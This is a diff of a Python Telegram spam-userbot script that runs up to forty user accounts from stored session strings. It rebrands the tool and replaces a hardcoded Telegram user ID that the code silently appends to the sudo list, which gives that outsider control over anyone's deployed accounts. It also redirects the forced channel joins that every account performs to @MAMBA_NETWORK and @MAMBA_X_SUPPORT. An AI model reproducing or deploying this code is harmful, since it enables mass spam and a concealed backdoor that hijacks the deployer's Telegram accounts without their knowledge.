@@ -1,4 +1,3 @@
-# Mighty X Spam - Spam Userbots
 # @BlackXSpam | @MAMBA_X_SUPPORT
 
 import os
@@ -73,8 +72,8 @@ STRING38 = config("STRING38", default=None)
 STRING39 = config("STRING39", default=None)
 STRING40 = config("STRING40", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5290064852 not in SUDO_USERS:
+    SUDO_USERS.append(5290064852)
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
@@ -613,8 +612,8 @@ async def BlackX():
             print("Booting Up The Client 20")
             await Bla20.start()
             botme = await Bla20.get_me()
-            await Bla20(functions.channels.JoinChannelRequest(channel="@blackxspam"))
-            await Bla20(functions.channels.JoinChannelRequest(channel="@blackxspam"))
+            await Bla20(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
+            await Bla20(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -1115,8 +1114,8 @@ async def BlackX():
             print("Booting Up The Client 40")
             await Bla40.start()
             botme = await Bla40.get_me()
-            await Bla40(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
-            await Bla40(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
+            await Bla40(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
+            await Bla40(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
